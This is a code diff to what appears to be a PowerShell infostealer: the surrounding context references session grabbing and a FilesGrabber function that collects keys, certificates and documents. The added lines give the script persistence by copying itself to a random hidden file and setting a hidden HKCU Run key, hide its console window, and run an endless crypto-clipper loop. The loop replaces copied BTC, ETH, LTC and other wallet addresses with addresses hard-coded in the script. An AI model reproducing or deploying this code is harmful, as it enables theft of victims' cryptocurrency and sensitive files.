@@ -955,7 +955,105 @@ function Backup-Data {
 	
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
-
+    $sctpth = $MyInvocation.MyCommand.Path
+    $ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
+    $ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP "$ran.ps1" } else { Join-Path $env:APPDATA "$ran.ps1" }
+     Copy-Item -Path $sctpth -Destination $ranpth -Force
+     Remove-Item -Path $sctpth -Force
+    
+    $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    $valn = "Powershell"
+    $val= """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ranpth"""
+    
+    if (!(Test-Path $key)) {
+        New-Item -Path $key -Force | Out-Null
+    }
+    
+    Set-ItemProperty -Path $key -Name $valn -Value $val
+    
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    public static void Hide()
+    {
+        IntPtr hWnd = GetConsoleWindow();
+        if(hWnd != IntPtr.Zero)
+        {
+            ShowWindow(hWnd, 0);
+        }
+    }
+    '
+    [Console.Window]::Hide()
+    
+    $attr = [System.IO.FileAttributes]::Hidden
+     Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr
+    
+    $addy = @{
+        "BTC" = "bc1q5zz4wvqrg9daz0hx44n5apf8kps33rah09x5rr"
+        "ETH" = "0xaa263b5e3c4ae754d7c66fcaf8d7b3804a827f08"
+        "LTC" = "LiDPraVwzjzUcDrFLLwyekqrsHbKGsggoh"
+        "TRX" = "TNKk4K9euQVthqNPakwSonpaZbTzwbqWny"
+        "BCH" = "17dJbfJJG3Nrme9tBckPNsqX7vAwtKL1tL"
+        "NEO" = "NPnK5n5FbdYQXurco91Son7ZEQbCiR28vB"
+        "XRP" = "rNxp4h8apvRis6mJf9Sh8C6iRxfrDWN7AV"
+        "ZEC" = "t1fAggd8d7KthBXJtkHZUWJYmd1rqLXU8GM"
+        "DOGE" = "DDgkNu57wZaRgv8xvUmFiy2L8tajZWhfUf"
+    }
+    while ($true) {
+        $clipper = Get-Clipboard
+        if ($clipper -match "^(bc1|tb1|1|3|bcrt)[a-zA-HJ-NP-Z0-9]{25,39}$") {
+            $clipper = $addy["BTC"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+        }
+        elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
+            $clipper = $addy["ETH"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+        }
+        
+        
+        elseif ($clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,39}$") {
+            $clipper = $addy["LTC"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+        }
+        
+        elseif ($clipper -match "^T[a-zA-HJ-NP-Z0-9]{33}$") {
+            $clipper = $addy["TRX"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+        }
+        
+        elseif ($clipper -match "((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}") {
+            $clipper = $addy["BCH"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+        } 
+         
+         elseif ($clipper -match "(?:^A[0-9a-zA-Z]{33}$)") {
+            $clipper = $addy["NEO"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+      
+        }
+        elseif ($clipper -match "(?:^r[0-9a-zA-Z]{24,34}$)") {
+            $clipper = $addy["XRP"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+      
+        }
+        
+      elseif ($clipper -match "^t1[a-zA-HJ-NP-Za-km-z0-9]{33}$") {
+            $clipper = $addy["ZEC"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+      
+    }
+    
+    
+     elseif ($clipper -match "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$") {
+            $clipper = $addy["DOGE"]
+            [System.Windows.Forms.Clipboard]::SetText($clipper)
+      
+    }
+       Start-Sleep -Seconds 0
+    }
+    
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
